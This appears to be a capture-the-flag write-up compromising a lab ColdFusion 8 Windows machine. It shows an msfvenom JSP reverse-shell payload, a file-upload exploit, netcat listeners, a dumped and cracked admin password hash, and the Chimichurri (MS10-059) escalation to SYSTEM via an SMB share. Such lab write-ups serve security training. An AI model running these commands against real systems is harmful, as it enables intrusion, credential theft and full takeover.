Here we have a web server so if we go to http://10.10.10.11:8500 we can see some folders. If we google that concepts

![[Pasted image 20230713115709.png]]

We can see that we have an Adobe Coldfusion webserver. After checking the folders and files, we see that is Adobe Coldfusion 8. Checking for Coldfusion 8 exploits we find this  **[github repository](https://github.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit)** which uploads a payload in jsp format through FCKeditor script. First we check our scripts folder to check if we have that script (/CFIDE/scripts/ajax/FCKeditor) and we have it, so let's build a jsp payload with msfvenom

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.5 LPORT=8000 -f raw > rshell.jsp
```

Now we can use the python exploit to upload our reverse shell

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Artic-10.10.10.11]
└─$ python exploit.py 10.10.10.11 8500 ./rshell.jsp
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

Now open a netcat listener on the port that we specified to msfvenom (1234) and go to the url provided by the exploit, where our reverse shell is (http://10.10.10.11:8500/userfiles/file/exploit.jsp)

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Artic-10.10.10.11]
└─$ nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.11] 50003
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

In C:\ColdFusion8\lib\password.properties we can find the admin hash

```bash
C:\ColdFusion8\lib>type password.properties
type password.properties
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

I don't know why but with John The Ripper I couldn't crack the password but I could with the website https://crackstation.net/ I cracked the password which is happyday, so admin credentials are Administrator:happyday. We will use **[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)** to check for kernel exploits to gain privilege escalation, so we store the systeminfo output in a txt file and execute it

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Resources/Windows-Exploit-Suggester]
└─$ python windows-exploit-suggester.py --database 2023-07-13-mssb.xls --systeminfo.txt ~/Documents/Boxes/Artic-10.10.10.11/systeminfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

We will go for MS10-059 which is called Chimichurri and we could use **[this exploit]( https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri)**. After download the file in the compiled folder called Chimichurri.exe we will create a smb share to transfer the file to the windows system

```bash
peluqqi@htb[/htb]$ sudo impacket-smbserver share -smb2support /smbfolder Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed
```

And download it in the windows machine. But before we have to open a netcat listener in our attacker machine because the Chimichurri exploit gain privileges through a reverse shell

```bash
WINDOWS
C:\ColdFusion8\runtime\bin>\\10.10.16.5\share\Chimichurri.exe 10.10.16.5 1234
\\10.10.16.5\share\Chimichurri.exe 10.10.16.5 1234
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\ColdFusion8\runtime\bin>

-------------------------------------------------------------------------------

ATTACKER
┌──(venv)─(kali㉿kali)-[~/Documents/Resources/Windows-Exploit-Suggester]
└─$ nc -nvlp 1234              
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.11] 49894
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system
```

And now we are authority\system